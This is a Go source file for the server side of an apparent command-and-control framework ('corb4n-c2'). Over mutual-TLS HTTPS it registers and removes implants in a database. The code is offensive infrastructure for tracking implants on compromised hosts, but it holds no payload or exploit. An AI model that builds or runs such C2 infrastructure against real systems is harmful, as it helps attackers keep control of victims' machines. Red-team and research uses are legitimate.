package c2

import (
	"crypto/tls"
	"encoding/json"
	"net/http"
	"path/filepath"

	"github.com/dovelus/corb4n-c2/server/comunication"
	"github.com/dovelus/corb4n-c2/server/db"
	"github.com/gorilla/mux"
)

type Request struct {
	ReqType string          `json:"req_type"`
	Content json.RawMessage `json:"content"`
}


// logRequest is a middleware that logs the details of each request
func logRequest(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		comunication.Logger.Infof("Received request: %s %s from %s", req.Method, req.URL.Path, req.RemoteAddr)
		handler.ServeHTTP(w, req)
	})
}

// Handler function to process requests based on ReqType
func RequestHandler(w http.ResponseWriter, r *http.Request) {
	// Parse the request
	var req Request
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Error("failed to decode request: %v", err)
		return
	}

	// Process the request based on ReqType
	switch req.ReqType {
	case "ImplantInfo":
		handleImplantInfo(w, req.Content)
	case "RemoveImplant":
		handleRemoveImplant(w, req.Content)
	default:
		http.Error(w, "unknown request type", http.StatusBadRequest)
		comunication.Logger.Error("unknown request type: %s", req.ReqType)
	}
}

// Handle ImplantInfo request
func handleImplantInfo(w http.ResponseWriter, content json.RawMessage) {
	var implant *db.Implant_info
	err := json.Unmarshal(content, &implant)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Error("failed to decode implant info: %v", err)
		return
	}

	err = db.AddImplant(implant)
	if err == comunication.ErrImplantExists {
		http.Error(w, err.Error(), http.StatusConflict)
		comunication.Logger.Error("implant already exists: %v", err)
		return
	}

	w.WriteHeader(http.StatusOK)
}

// Handle RemoveImplant request
func handleRemoveImplant(w http.ResponseWriter, content json.RawMessage) {
	var data struct {
		ID string `json:"id"`
	}
	err := json.Unmarshal(content, &data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Error("failed to decode remove implant request: %v", err)
		return
	}

	err = db.RemoveImplant(data.ID)
	if err == comunication.ErrNoResults {
		http.Error(w, err.Error(), http.StatusNotFound)
		comunication.Logger.Error("no results found: %v", err)
		return
	}

	w.WriteHeader(http.StatusOK)
}

func StartHTTPServer() {
	serverCertPath, err := filepath.Abs("certs/server.crt")
	if err != nil {
		comunication.Logger.Fatal("failed to get absolute path for server certificate: %v", err)
	}
	serverKeyPath, err := filepath.Abs("certs/server.key")
	if err != nil {
		comunication.Logger.Fatal("failed to get absolute path for server key: %v", err)
	}

	serverCert, err := LoadServerCertificate(serverCertPath, serverKeyPath)
	if err != nil {
		comunication.Logger.Fatal("failed to load server certificate: %v", err)
	}

	clientCAPool, err := LoadClientCACertificate("certs/client.crt")
	if err != nil {
		comunication.Logger.Fatal("failed to load client CA certificate: %v", err)
	}

	tlsConfig := CreateTLSConfig(serverCert, clientCAPool)

	r := mux.NewRouter()
	r.Use(logRequest)
	r.HandleFunc("/request", RequestHandler).Methods("POST")

	srv := &http.Server{
		Addr:         ":8443",
		Handler:      r,
		TLSConfig:    tlsConfig,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}

	comunication.Logger.Fatal(srv.ListenAndServeTLS("", ""))
}
